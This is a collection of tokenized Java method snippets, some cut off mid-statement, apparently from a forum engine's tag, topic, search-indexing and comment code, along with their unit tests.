public ModelAndView showList ( HttpServletRequest request , @RequestParam ( value = " newFavoriteTagName " , required = false ) String newFavoriteTagName , @RequestParam ( value = " newIgnoredTagName " , required = false ) String newIgnoredTagName ) throws AccessViolationException { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } User user = tmpl . getCurrentUser ( ) ; user . checkAnonymous ( ) ; ModelAndView modelAndView = new ModelAndView ( " user-filter-list " ) ; Map < Integer , User > ignoreMap = createIgnoreMap ( ignoreListDao . get ( user ) ) ; Map < Integer , Remark > ignoreRemarks = getIgnoreRemarks ( user , ignoreMap . values ( ) ) ; modelAndView . addObject ( " ignoreRemarks " , ignoreRemarks ) ; modelAndView . addObject ( " ignoreList " , ignoreMap ) ; modelAndView . addObject ( " favoriteTags " , userTagService . favoritesGet ( user ) ) ; if ( ! tmpl . isModeratorSession ( ) ) { modelAndView . addObject ( " ignoreTags " , userTagService . ignoresGet ( user ) ) ; } else { modelAndView . addObject ( " isModerator " , true ) ; } if ( newFavoriteTagName ! = null & & TagName . isGoodTag ( newFavoriteTagName ) ) { modelAndView . addObject ( " newFavoriteTagName " , newFavoriteTagName ) ; } if ( newIgnoredTagName ! = null & & TagName . isGoodTag ( newIgnoredTagName ) ) { modelAndView . addObject ( " newIgnoredTagName " , newIgnoredTagName ) ; } return modelAndView ; } 
public void createTag ( String tagName ) { Preconditions . checkArgument ( TagName . isGoodTag ( tagName ) , " Tag name must be valid " ) ; jdbcTemplate . update ( " INSERT INTO tags_values (value) VALUES(?) " , tagName ) ; } 
public void prefixSearchEscapeTest ( ) { tagDao . createTag ( " zestxtest " ) ; assertEquals ( 0 , tagDao . getTagsByPrefix ( " zest_ " , 0 ) . size ( ) ) ; assertEquals ( 0 , tagDao . getTagsByPrefix ( " zest% " , 0 ) . size ( ) ) ; } 
public int doStartTag ( ) throws JspException { JspWriter out = pageContext . getOut ( ) ; if ( list ! = null ) { try { StringBuilder buf = new StringBuilder ( ) ; for ( TagRef el : list ) { if ( buf . length ( ) > 0 ) { buf . append ( " , " ) ; } if ( el . url ( ) . isDefined ( ) ) { buf . append ( " <a class=tag rel=tag href= \" " ) . append ( el . url ( ) . get ( ) ) . append ( " \" > " ) . append ( StringUtil . escapeHtml ( el . name ( ) ) ) . append ( " </a> " ) ; } else { buf . append ( StringUtil . escapeHtml ( el . name ( ) ) ) ; } } out . append ( buf ) ; } catch ( IOException e ) { throw new JspException ( " Error: " + e . getMessage ( ) ) ; } } return SKIP_BODY ; } 
public static String toString ( Collection < String > tags ) { return Joiner . on ( " , " ) . join ( tags ) ; } 
public PreparedTopic prepareTopic ( Topic message , boolean secure , User user ) { return prepareMessage ( message , topicTagService . getTagRefs ( message ) , false , null , secure , user , null , null ) ; } 
public PreparedTopic prepareTopicPreview ( Topic message , List < TagRef > tags , Poll newPoll , boolean secure , String text , Image image ) { return prepareMessage ( message , 
private PreparedTopic prepareMessage ( Topic message , List < TagRef > tags , boolean minimizeCut , PreparedPoll poll , boolean secure , User user , MessageText text , @Nullable Image image ) { try { Group group = groupDao . getGroup ( message . getGroupId ( ) ) ; 
public List < PersonalizedPreparedTopic > prepareMessagesForUser ( List < Topic > messages , boolean secure , User user , Profile profile , boolean loadUserpics ) { List < PersonalizedPreparedTopic > pm = new ArrayList < > ( messages . size ( ) ) ; Map < Integer , MessageText > textMap = loadTexts ( messages ) ; ImmutableListMultimap < Integer , TagRef > tags = topicTagService . getTagRefs ( messages ) ; for ( Topic message : messages ) { PreparedTopic preparedMessage = prepareMessage ( message , tags . get ( message . getId ( ) ) , true , null , secure , user , textMap . get ( message . getId ( ) ) , null ) ; TopicMenu topicMenu = getTopicMenu ( preparedMessage , user , secure , profile , loadUserpics ) ; pm . add ( new PersonalizedPreparedTopic ( preparedMessage , topicMenu ) ) ; } return pm ; } 
public List < PreparedTopic > prepareMessages ( List < Topic > messages , boolean secure ) { List < PreparedTopic > pm = new ArrayList < > ( messages . size ( ) ) ; Map < Integer , MessageText > textMap = loadTexts ( messages ) ; ImmutableListMultimap < Integer , TagRef > tags = topicTagService . getTagRefs ( messages ) ; for ( Topic message : messages ) { PreparedTopic preparedMessage = prepareMessage ( message , tags . get ( message . getId ( ) ) , true , null , secure , null , textMap . get ( message . getId ( ) ) , null ) ; pm . add ( preparedMessage ) ; } return pm ; } 
public ModelAndView tagPage ( HttpServletRequest request , @PathVariable String tag ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; TagName . checkTag ( tag ) ; ModelAndView mv = new ModelAndView ( " tag-page " ) ; mv . addObject ( " tag " , tag ) ; mv . addObject ( " title " , WordUtils . capitalize ( tag ) ) ; mv . addObject ( " counter " , tagService . getCounter ( tag ) ) ; if ( tmpl . isSessionAuthorized ( ) ) { mv . addObject ( " showFavoriteTagButton " , ! userTagService . hasFavoriteTag ( tmpl . getCurrentUser ( ) , tag ) ) ; mv . addObject ( " showUnFavoriteTagButton " , userTagService . hasFavoriteTag ( tmpl . getCurrentUser ( ) , tag ) ) ; } int tagId = tagService . getTagId ( tag ) ; mv . addObject ( " favsCount " , userTagService . countFavs ( tagId ) ) ; List < TagRef > relatedTags = tagService . getRelatedTags ( tagId ) ; if ( relatedTags . size ( ) > 1 ) { mv . addObject ( " relatedTags " , relatedTags ) ; } mv . addAllObjects ( getNewsSection ( request , tag ) ) ; mv . addAllObjects ( getGallerySection ( tag , tagId , tmpl ) ) ; mv . addAllObjects ( getForumSection ( tag , tagId ) ) ; return mv ; } 
public void processRow ( ResultSet resultSet ) throws SQLException { builder . add ( new TagInfo ( 
public void prefixSearchExactTest ( ) { tagDao . createTag ( " zest " ) ; tagDao . createTag ( " zesd " ) ; List < TagInfo > tags = tagDao . getTagsByPrefix ( " zest " , 0 ) ; assertEquals ( 1 , tags . size ( ) ) ; } 
public void prefixSearchSimpleTest ( ) { tagDao . createTag ( " zest " ) ; tagDao . createTag ( " zesd " ) ; List < TagInfo > tags = tagDao . getTagsByPrefix ( " ze " , 0 ) ; assertEquals ( 2 , tags . size ( ) ) ; } 
public void processRow ( ResultSet resultSet ) throws SQLException { builder . add ( new TagInfo ( 
public int favoriteAdd ( User user , String tagName ) throws TagNotFoundException { int tagId = tagDao . getTagId ( tagName ) ; userTagDao . addTag ( user . getId ( ) , tagId , true ) ; return tagId ; } 
public void prefixSearchSimpleTest ( ) { int zest = tagDao . createTag ( " zest " ) ; int zesd = tagDao . createTag ( " zesd " ) ; List < TagInfo > tags = tagDao . getTagsByPrefix ( " ze " , 0 ) ; assertEquals ( 2 , tags . size ( ) ) ; assertEquals ( zesd , tags . get ( 0 ) . id ( ) ) ; assertEquals ( zest , tags . get ( 1 ) . id ( ) ) ; } 
public TagInfo mapRow ( ResultSet rs , int rowNum ) throws SQLException { return new TagInfo ( rs . getString ( " value " ) , rs . getInt ( " counter " ) , rs . getInt ( " id " ) ) ; } 
public ModelAndView tagPage ( HttpServletRequest request , @PathVariable String tag ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; TagName . checkTag ( tag ) ; ModelAndView mv = new ModelAndView ( " tag-page " ) ; mv . addObject ( " tag " , tag ) ; mv . addObject ( " title " , WordUtils . capitalize ( tag ) ) ; TagInfo tagInfo = tagService . getTagInfo ( tag , true ) ; mv . addObject ( " counter " , tagInfo . topicCount ( ) ) ; if ( tmpl . isSessionAuthorized ( ) ) { mv . addObject ( " showFavoriteTagButton " , ! userTagService . hasFavoriteTag ( tmpl . getCurrentUser ( ) , tag ) ) ; mv . addObject ( " showUnFavoriteTagButton " , userTagService . hasFavoriteTag ( tmpl . getCurrentUser ( ) , tag ) ) ; } int tagId = tagInfo . id ( ) ; mv . addObject ( " favsCount " , userTagService . countFavs ( tagId ) ) ; List < TagRef > relatedTags = tagService . getRelatedTags ( tagId ) ; if ( relatedTags . size ( ) > 1 ) { mv . addObject ( " relatedTags " , relatedTags ) ; } mv . addAllObjects ( getNewsSection ( request , tag ) ) ; mv . addAllObjects ( getGallerySection ( tag , tagId , tmpl ) ) ; mv . addAllObjects ( getForumSection ( tag , tagId ) ) ; return mv ; } 
public int getTagId ( String tag ) throws TagNotFoundException { return tagDao . getTagId ( tag ) ; } 
public TagInfo getTagInfo ( String tag , boolean skipZero ) throws TagNotFoundException { int tagId = tagDao . getTagId ( tag , skipZero ) ; return tagDao . getTagInfo ( tagId ) ; } 
public int getTagId ( String tag ) throws TagNotFoundException { Optional < Integer > tagId = tagDao . getTagId ( tag ) ; if ( tagId . isPresent ( ) ) { return tagId . get ( ) ; 
public void change ( String oldTagName , String tagName , Errors errors ) { try { TagName . checkTag ( tagName ) ; 
public void delete ( String tagName , String newTagName , Errors errors ) { try { int oldTagId = getTagId ( tagName ) ; 
public Integer get ( ) { return tagDao . createTag ( tagName ) ; } 
public TagInfo getTagInfo ( String tag , boolean skipZero ) throws TagNotFoundException { Optional < Integer > tagId = tagDao . getTagId ( tag , skipZero ) ; if ( ! tagId . isPresent ( ) ) { throw new TagNotFoundException ( ) ; } return tagDao . getTagInfo ( tagId . get ( ) ) ; } 
public int favoriteAdd ( User user , String tagName ) throws TagNotFoundException { int tagId = tagService . getTagId ( tagName ) ; userTagDao . addTag ( user . getId ( ) , tagId , true ) ; return tagId ; } 
public int favoriteDel ( User user , String tagName ) throws TagNotFoundException { int tagId = tagService . getTagId ( tagName ) ; userTagDao . deleteTag ( user . getId ( ) , tagId , true ) ; return tagId ; } 
public void ignoreAdd ( User user , String tagName ) throws TagNotFoundException { int tagId = tagService . getTagId ( tagName ) ; userTagDao . addTag ( user . getId ( ) , tagId , false ) ; } 
public void ignoreDel ( User user , String tagName ) throws TagNotFoundException { int tagId = tagService . getTagId ( tagName ) ; userTagDao . deleteTag ( user . getId ( ) , tagId , false ) ; } 
public void resetTagDaoMock ( ) { reset ( tagDao ) ; when ( tagDao . getTagId ( anyString ( ) ) ) . thenReturn ( Optional . < Integer > absent ( ) ) ; } 
public void changeTest ( ) throws Exception { when ( tagDao . getTagId ( " testTag " ) ) . thenReturn ( Optional . of ( 123 ) ) ; when ( tagDao . getTagId ( " testNewTag " ) ) . thenReturn ( Optional . of ( 456 ) ) ; prepareChangeDataBinder ( ) ; tagService . change ( " InvalidTestTag " , " testNewTag " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareChangeDataBinder ( ) ; tagService . change ( " testTag " , " #$%@@#%$ " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareChangeDataBinder ( ) ; tagService . change ( " #$%@@#%$ " , " testNewTag " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareChangeDataBinder ( ) ; tagService . change ( " testTag " , " testNewTag " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; resetTagDaoMock ( ) ; when ( tagDao . getTagId ( " testTag " ) ) . thenReturn ( Optional . of ( 123 ) ) ; when ( tagDao . getTagId ( " testNewTag " ) ) . thenReturn ( Optional . < Integer > absent ( ) ) ; prepareChangeDataBinder ( ) ; tagService . change ( " testTag " , " testNewTag " , binder . getBindingResult ( ) ) ; assertFalse ( binder . getBindingResult ( ) . hasErrors ( ) ) ; } 
public void deleteTest ( ) throws Exception { when ( tagDao . getTagId ( " testTag " ) ) . thenReturn ( Optional . of ( 123 ) ) ; when ( tagDao . getTagId ( " InvalidTestTag " ) ) . thenReturn ( Optional . < Integer > absent ( ) ) ; prepareDeleteDataBinder ( ) ; tagService . delete ( " InvalidTestTag " , " testNewTag " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareDeleteDataBinder ( ) ; tagService . delete ( " testTag " , " #$%@@#%$ " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareDeleteDataBinder ( ) ; tagService . delete ( " testTag " , " testTag " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareDeleteDataBinder ( ) ; tagService . delete ( " testTag " , " testNewTag " , binder . getBindingResult ( ) ) ; assertFalse ( binder . getBindingResult ( ) . hasErrors ( ) ) ; } 
public void resetMockObjects ( ) throws Exception { reset ( userTagDao ) ; reset ( tagDao ) ; when ( tagDao . getTagId ( " tag1 " ) ) . thenReturn ( Optional . of ( 2 ) ) ; user = getUser ( 1 ) ; } 
public void favoriteAddTest ( ) throws TagNotFoundException { when ( tagDao . getTagId ( " tag1 " ) ) . thenReturn ( Optional . of ( 2 ) ) ; userTagService . favoriteAdd ( user , " tag1 " ) ; verify ( userTagDao ) . addTag ( eq ( 1 ) , eq ( 2 ) , eq ( true ) ) ; } 
public void favoriteDelTest ( ) throws TagNotFoundException { userTagService . favoriteDel ( user , " tag1 " ) ; verify ( userTagDao ) . deleteTag ( eq ( 1 ) , eq ( 2 ) , eq ( true ) ) ; } 
public void ignoreAddTest ( ) throws TagNotFoundException { userTagService . ignoreAdd ( user , " tag1 " ) ; verify ( userTagDao ) . addTag ( eq ( 1 ) , eq ( 2 ) , eq ( false ) ) ; } 
public void ignoreDelTest ( ) throws TagNotFoundException { userTagService . ignoreDel ( user , " tag1 " ) ; verify ( userTagDao ) . deleteTag ( eq ( 1 ) , eq ( 2 ) , eq ( false ) ) ; } 
public ModelAndView showTagListHandler ( @PathVariable String firstLetter ) throws TagNotFoundException { ModelAndView modelAndView = new ModelAndView ( " tags " ) ; Collection < String > firstLetters = tagService . getFirstLetters ( ) ; modelAndView . addObject ( " firstLetters " , firstLetters ) ; if ( Strings . isNullOrEmpty ( firstLetter ) ) { firstLetter = firstLetters . iterator ( ) . next ( ) ; } modelAndView . addObject ( " currentLetter " , firstLetter ) ; Map < String , Integer > tags = tagService . getTagsByPrefix ( firstLetter , 1 ) ; if ( tags . isEmpty ( ) ) { throw new TagNotFoundException ( " Tag list is empty " ) ; } modelAndView . addObject ( " tags " , tags ) ; return modelAndView ; } 
List < String > showTagListHandlerJSON ( @RequestParam ( " term " ) final String term ) { Collection < String > tags = tagService . suggestTagsByPrefix ( term , 10 ) ; return ImmutableList . copyOf ( Iterables . filter ( tags , new Predicate < String > ( ) { @Override 
public int getTagId ( String tag ) throws TagNotFoundException { Option < Integer > tagId = tagDao . getTagId ( tag ) ; if ( tagId . isDefined ( ) ) { return tagId . get ( ) ; 
public Collection < String > suggestTagsByPrefix ( String prefix , int count ) { return tagDao . getTopTagsByPrefix ( prefix , 2 , count ) ; } 
public TagInfo getTagInfo ( String tag , boolean skipZero ) throws TagNotFoundException { Option < Integer > tagId = tagDao . getTagId ( tag , skipZero ) ; if ( tagId . isEmpty ( ) ) { throw new TagNotFoundException ( ) ; } return tagDao . getTagInfo ( tagId . get ( ) ) ; } 
public void prefixTopSearchExactTest ( ) { tagDao . createTag ( " zest " ) ; tagDao . createTag ( " zesd " ) ; Collection < String > tags = tagDao . getTopTagsByPrefix ( " zest " , 0 , 20 ) ; assertEquals ( 1 , tags . size ( ) ) ; } 
public TagDao tagDao ( DataSource ds ) { return new TagDao ( ds ) ; } 
public void resetTagDaoMock ( ) { reset ( tagDao ) ; when ( tagDao . getTagId ( anyString ( ) ) ) . thenReturn ( noneInteger ) ; } 
public void changeTest ( ) throws Exception { when ( tagDao . getTagId ( " testTag " ) ) . thenReturn ( Option . apply ( 123 ) ) ; when ( tagDao . getTagId ( " testNewTag " ) ) . thenReturn ( Option . apply ( 456 ) ) ; prepareChangeDataBinder ( ) ; tagService . change ( " InvalidTestTag " , " testNewTag " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareChangeDataBinder ( ) ; tagService . change ( " testTag " , " #$%@@#%$ " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareChangeDataBinder ( ) ; tagService . change ( " #$%@@#%$ " , " testNewTag " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareChangeDataBinder ( ) ; tagService . change ( " testTag " , " testNewTag " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; resetTagDaoMock ( ) ; when ( tagDao . getTagId ( " testTag " ) ) . thenReturn ( Option . apply ( 123 ) ) ; when ( tagDao . getTagId ( " testNewTag " ) ) . thenReturn ( noneInteger ) ; prepareChangeDataBinder ( ) ; tagService . change ( " testTag " , " testNewTag " , binder . getBindingResult ( ) ) ; assertFalse ( binder . getBindingResult ( ) . hasErrors ( ) ) ; } 
public void deleteTest ( ) throws Exception { when ( tagDao . getTagId ( " testTag " ) ) . thenReturn ( Option . apply ( 123 ) ) ; when ( tagDao . getTagId ( " InvalidTestTag " ) ) . thenReturn ( noneInteger ) ; prepareDeleteDataBinder ( ) ; tagService . delete ( " InvalidTestTag " , " testNewTag " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareDeleteDataBinder ( ) ; tagService . delete ( " testTag " , " #$%@@#%$ " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareDeleteDataBinder ( ) ; tagService . delete ( " testTag " , " testTag " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareDeleteDataBinder ( ) ; tagService . delete ( " testTag " , " testNewTag " , binder . getBindingResult ( ) ) ; assertFalse ( binder . getBindingResult ( ) . hasErrors ( ) ) ; } 
public void resetMockObjects ( ) throws Exception { reset ( userTagDao ) ; reset ( tagDao ) ; when ( tagDao . getTagId ( " tag1 " ) ) . thenReturn ( Option . apply ( 2 ) ) ; user = getUser ( 1 ) ; } 
public void favoriteAddTest ( ) throws TagNotFoundException { when ( tagDao . getTagId ( " tag1 " ) ) . thenReturn ( Option . apply ( 2 ) ) ; userTagService . favoriteAdd ( user , " tag1 " ) ; verify ( userTagDao ) . addTag ( eq ( 1 ) , eq ( 2 ) , eq ( true ) ) ; } 
public void createAndGetTest ( ) { int id = tagDao . createTag ( " test-tag " ) ; Option < Integer > fetchId = tagDao . getTagId ( " test-tag " ) ; assertEquals ( Option . apply ( id ) , fetchId ) ; } 
public void testTagNotFound ( ) { Option < Integer > fetch = tagDao . getTagId ( " fdsfsdfdsfsdfs " ) ; assertTrue ( fetch . isEmpty ( ) ) ; } 
public void replaceTag ( int oldTagId , int newTagId , String newTagName ) { userTagDao . replaceTag ( oldTagId , newTagId ) ; } 
public int doStartTag ( ) throws JspException { JspWriter out = pageContext . getOut ( ) ; if ( list ! = null ) { try { StringBuilder buf = new StringBuilder ( " <p class= \" tags \" ><i class= \" icon-tag \" ></i>&nbsp; " ) ; boolean first = true ; for ( TagRef el : list ) { if ( ! first ) { buf . append ( " , " ) ; } else { first = false ; } if ( el . url ( ) . isDefined ( ) ) { buf . append ( " <a class=tag rel=tag href= \" " ) . append ( el . url ( ) . get ( ) ) . append ( " \" > " ) . append ( StringUtil . escapeHtml ( el . name ( ) ) ) . append ( " </a> " ) ; } else { buf . append ( StringUtil . escapeHtml ( el . name ( ) ) ) ; } } buf . append ( " </p> " ) ; out . append ( buf ) ; } catch ( IOException e ) { throw new JspException ( " Error: " + e . getMessage ( ) ) ; } } return SKIP_BODY ; } 
public static String removeInvalidXmlChars ( String str ) { return INVALID_XML . matcher ( str ) . replaceAll ( " " ) ; } 
public Client elasticsearch ( ) { return Mockito . mock ( Client . class ) ; } 
private void updateMessage ( Topic topic ) { Map < String , Object > doc = new HashMap < > ( ) ; Section section = sectionService . getSection ( topic . getSectionId ( ) ) ; Group group = groupDao . getGroup ( topic . getGroupId ( ) ) ; User author = userDao . getUserCached ( topic . getUid ( ) ) ; doc . put ( " section " , section . getUrlName ( ) ) ; doc . put ( " topic_author " , author . getNick ( ) ) ; doc . put ( " topic_id " , topic . getId ( ) ) ; doc . put ( " author " , author . getNick ( ) ) ; doc . put ( " group " , group . getUrlName ( ) ) ; doc . put ( " title " , topic . getTitleUnescaped ( ) ) ; doc . put ( " topic_title " , topic . getTitleUnescaped ( ) ) ; doc . put ( " message " , extractText ( msgbaseDao . getMessageText ( topic . getId ( ) ) ) ) ; Date postdate = topic . getPostdate ( ) ; doc . put ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . put ( " tag " , topicDao . getTags ( topic ) ) ; doc . put ( " is_comment " , false ) ; client . prepareIndex ( MESSAGES_INDEX , MESSAGES_TYPE , Integer . toString ( topic . getId ( ) ) ) 
private IndexRequestBuilder processComment ( Topic topic , Comment comment , String message ) { Map < String , Object > doc = new HashMap < > ( ) ; Section section = sectionService . getSection ( topic . getSectionId ( ) ) ; Group group = groupDao . getGroup ( topic . getGroupId ( ) ) ; User author = userDao . getUserCached ( comment . getUserid ( ) ) ; User topicAuthor = userDao . getUserCached ( topic . getUid ( ) ) ; doc . put ( " section " , section . getUrlName ( ) ) ; doc . put ( " topic_author " , topicAuthor . getNick ( ) ) ; doc . put ( " topic_id " , topic . getId ( ) ) ; doc . put ( " author " , author . getNick ( ) ) ; doc . put ( " group " , group . getUrlName ( ) ) ; String topicTitle = topic . getTitleUnescaped ( ) ; doc . put ( " topic_title " , topicTitle ) ; String commentTitle = comment . getTitle ( ) ; if ( commentTitle ! = null & & ! commentTitle . isEmpty ( ) & & ! commentTitle . equals ( topicTitle ) & & ! commentTitle . startsWith ( " Re: " ) ) { doc . put ( " title " , StringEscapeUtils . unescapeHtml ( commentTitle ) ) ; } doc . put ( " message " , message ) ; Date postdate = comment . getPostdate ( ) ; doc . put ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . put ( " tag " , topicDao . getTags ( topic ) ) ; doc . put ( " is_comment " , true ) ; return client . prepareIndex ( MESSAGES_INDEX , MESSAGES_TYPE , Integer . toString ( comment . getId ( ) ) ) 
public PreparedTopic prepareTopic ( Topic message , List < TagRef > tags , boolean secure , User user ) { return prepareMessage ( message , tags , false , null , secure , user , null , null ) ; } 
public PreparedTopic prepareTopic ( Topic message , boolean secure , User user ) { return prepareMessage ( message , 
public PreparedTopic prepareTopic ( Topic message , List < TagRef > tags , boolean secure , User user ) { return prepareMessage ( message , 
public PreparedTopic prepareTopic ( Topic message , List < TagRef > tags , boolean secure , User user , MessageText text ) { return prepareMessage ( message , 
private void updateMessage ( Topic topic ) { Map < String , Object > doc = new HashMap < > ( ) ; Section section = sectionService . getSection ( topic . getSectionId ( ) ) ; Group group = groupDao . getGroup ( topic . getGroupId ( ) ) ; User author = userDao . getUserCached ( topic . getUid ( ) ) ; doc . put ( " section " , section . getUrlName ( ) ) ; doc . put ( " topic_author " , author . getNick ( ) ) ; doc . put ( " topic_id " , topic . getId ( ) ) ; doc . put ( " author " , author . getNick ( ) ) ; doc . put ( " group " , group . getUrlName ( ) ) ; doc . put ( " title " , topic . getTitleUnescaped ( ) ) ; doc . put ( " topic_title " , topic . getTitleUnescaped ( ) ) ; doc . put ( " message " , lorCodeService . extractPlainText ( msgbaseDao . getMessageText ( topic . getId ( ) ) ) ) ; Date postdate = topic . getPostdate ( ) ; doc . put ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . put ( " tag " , topicDao . getTags ( topic ) ) ; doc . put ( " is_comment " , false ) ; client . prepareIndex ( MESSAGES_INDEX , MESSAGES_TYPE , Integer . toString ( topic . getId ( ) ) ) 
public String extractPlainTextFromLorcode ( String text ) { return defaultParser . parseRoot ( prepareCommentRootNode ( false , true , false ) , text ) . renderOg ( ) ; } 
public String trimPlainText ( String plainText , int maxLength , boolean encodeHtml ) { String cut ; if ( plainText . length ( ) < maxLength ) { cut = plainText ; } else { cut = plainText . substring ( 0 , maxLength ) . trim ( ) + " ... " ; } if ( encodeHtml ) { return StringUtil . escapeForceHtml ( cut ) ; 
public String extractPlainText ( MessageText text ) { if ( text . isLorcode ( ) ) { return extractPlainTextFromLorcode ( text . getText ( ) ) ; 
public boolean isEmptyTextComment ( String msg ) { return extractPlainTextFromLorcode ( msg . trim ( ) ) . isEmpty ( ) ; } 
public void testOg ( ) { assertEquals ( " hello " , lorCodeService . extractPlainTextFromLorcode ( " hello " ) ) ; assertEquals ( " one crap two three " , lorCodeService . extractPlainTextFromLorcode ( " [list] " + " [*]one " + '' + " crap " + " [*]two " + " [*]three " + " [/list] " ) ) ; assertEquals ( " due one teo neo wuf? nok " , lorCodeService . extractPlainTextFromLorcode ( " due n[quote][quote]one[br][/quote]teo[br][quote]neo[br][/quote][/quote]wuf? nok " ) ) ; assertEquals ( " &amp;#9618; " , lorCodeService . trimPlainText ( lorCodeService . extractPlainTextFromLorcode ( " [code]&#9618;[/code] " ) , 250 , true ) ) ; String txt = " many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b] " ; assertEquals ( " many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many t... " , lorCodeService . trimPlainText ( lorCodeService . extractPlainTextFromLorcode ( txt ) , 250 , true ) ) ; assertEquals ( 250 + 3 , 
public ModelAndView getMessageNewMain ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( value = " cid " , required = false ) Integer cid , @PathVariable ( " section " ) String sectionName , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) throws Exception { if ( cid ! = null ) { return jumpMessage ( request , msgid , cid ) ; } Section section = sectionService . getSectionByName ( sectionName ) ; boolean rss = request . getParameter ( " output " ) ! = null & & " rss " . equals ( request . getParameter ( " output " ) ) ; if ( rss ) { return getMessageRss ( section , request , response , groupName , msgid ) ; 
public Client elasticsearch ( ) { Client mockClient = Mockito . mock ( Client . class ) ; Mockito . when ( mockClient . prepareSearch ( Matchers . anyString ( ) ) ) . thenThrow ( new ElasticSearchException ( " no ES here " ) ) ; return mockClient ; } 
private QueryBuilder boost ( QueryBuilder query ) { FunctionScoreQueryBuilder booster = functionScoreQuery ( query ) ; booster . add ( termFilter ( " is_comment " , " false " ) , ScoreFunctionBuilders . factorFunction ( TOPIC_BOOST ) ) ; booster . add ( rangeFilter ( " postdate " ) . gte ( " now/d-3y " ) , ScoreFunctionBuilders . factorFunction ( RECENT_BOOST ) ) ; return booster ; } 
public void saveNewMessage ( String message , int msgid ) { insertMsgbase . execute ( ImmutableMap . < String , Object > of ( " id " , msgid , 
public int saveNewMessage ( final Topic msg , final User user , String text , final String userAgent , final Group group ) { final int msgid = allocateMsgid ( ) ; String url = msg . getUrl ( ) ; String linktext = msg . getLinktext ( ) ; final String finalUrl = url ; final String finalLinktext = linktext ; jdbcTemplate . execute ( " INSERT INTO topics (groupid, userid, title, url, moderate, postdate, id, linktext, deleted, ua_id, postip, draft) VALUES (?, ?, ?, ?, 'f', CURRENT_TIMESTAMP, ?, ?, 'f', create_user_agent(?),?::inet, ?) " , new PreparedStatementCallback < String > ( ) { @Override public String doInPreparedStatement ( PreparedStatement pst ) throws SQLException , DataAccessException { pst . setInt ( 1 , group . getId ( ) ) ; pst . setInt ( 2 , user . getId ( ) ) ; pst . setString ( 3 , msg . getTitle ( ) ) ; pst . setString ( 4 , finalUrl ) ; pst . setInt ( 5 , msgid ) ; pst . setString ( 6 , finalLinktext ) ; pst . setString ( 7 , userAgent ) ; pst . setString ( 8 , msg . getPostIP ( ) ) ; pst . setBoolean ( 9 , msg . isDraft ( ) ) ; pst . executeUpdate ( ) ; return null ; } } ) ; msgbaseDao . saveNewMessage ( text , msgid ) ; return msgid ; } 
public void changeTitle ( Comment oldComment , String title ) { jdbcTemplate . update ( " UPDATE comments SET title=? WHERE id=? " , title , oldComment . getId ( ) 
public void editCommentTest ( ) { int commentId = jdbcTemplate . queryForObject ( " select nextval('s_msgid') " , Integer . class ) ; addComment ( commentId , null , " CommentDaoIntegrationTest.editCommentTest() " , " CommentDaoIntegrationTest.editCommentTest(): comment body " ) ; Comment oldComment = mock ( Comment . class ) ; when ( oldComment . getId ( ) ) . thenReturn ( commentId ) ; commentDao . changeTitle ( oldComment , " CommentDaoIntegrationTest.editCommentTest(): new title " ) ; List < Map < String , Object > > rows = getComment ( commentId ) ; assertFalse ( " No any records " , rows . isEmpty ( ) ) ; Map < String , Object > row = rows . get ( 0 ) ; assertEquals ( " CommentDaoIntegrationTest.editCommentTest(): new title " , row . get ( " title " ) ) ; } 
public boolean isDeprecated ( ) { return deprecated ; } 
